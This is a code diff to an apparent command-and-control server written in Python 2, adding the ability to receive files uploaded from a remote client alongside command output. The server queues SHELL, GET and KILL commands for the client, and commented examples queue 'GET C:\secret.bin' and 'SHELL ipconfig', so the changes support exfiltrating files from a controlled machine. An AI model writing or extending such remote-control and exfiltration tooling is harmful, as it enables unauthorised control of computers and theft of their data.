@@ -14,6 +14,8 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from urlparse import parse_qs
+import cgi
+import os
 from Queue import Queue
 from threading import Thread
 
@@ -44,21 +46,39 @@ class myHandler(BaseHTTPRequestHandler):
 
     # Result from executing command
     def do_POST(self):
-        length = int(self.headers['content-length'])
-        result = parse_qs(self.rfile.read(length), keep_blank_values=1)['result'][0]
-        print result
+        ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
+
+        # File upload
+        if ctype == 'multipart/form-data':
+            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
+            filename = form['upfile'].filename
+            data = form['upfile'].file.read()
+
+            with file(os.path.join('download', filename), 'wb') as f:
+                f.write(data)
+
+            print 'File \'%s\' downloaded.' % filename
+        # Regular response
+        else:
+            length = int(self.headers['content-length'])
+            result = parse_qs(self.rfile.read(length), keep_blank_values=1)['result'][0]
+            print result
+
+        # Respond
         self.send_response(200)
         self.send_header('content-type', 'text/plain')
         self.end_headers()
         self.wfile.write('OK')
         return
 
+    # Do not write log messages to console
     def log_message(self, format, *args):
         return
 
 
 def run_httpserver():
-    #commands.put('dir C:\\')
+    #commands.put('GET C:\\secret.bin')
+    #commands.put('SHELL ipconfig')
     server = HTTPServer(('', PORT_NUMBER), myHandler)
     server.serve_forever()
 
@@ -107,8 +127,11 @@ try:
             elif cmd == 'SHELL':
                 context = 'SHELL'
                 continue
+            elif cmd == 'KILL':
+                dummy = 'x'
             else:
                 print '%s > Unknown command: %s' % (context, s)
+                continue
 
         commands.put(' '.join([cmd, args]))
 
